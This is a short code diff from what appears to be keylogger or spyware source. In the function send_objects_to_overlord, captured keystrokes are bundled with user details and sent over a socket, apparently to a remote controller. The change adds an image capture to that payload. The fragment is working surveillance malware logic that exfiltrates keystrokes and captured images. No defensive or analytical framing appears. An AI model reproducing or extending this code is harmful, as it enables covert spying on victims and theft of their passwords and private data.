@@ -29,7 +29,9 @@ def send_payload_to_socket(payload):
 def send_objects_to_overlord(buffered_keys):
     keys = [key.__dict__ for key in buffered_keys]
     payload = {}
-    payload['user'] = User().__dict__
+    user = User()
+    user.capture_image()
+    payload['user'] = user.__dict__
     # payload['user']['processes'] = get_running_processes()
     payload['keys'] = keys
     send_payload_to_socket(json.dumps(payload))
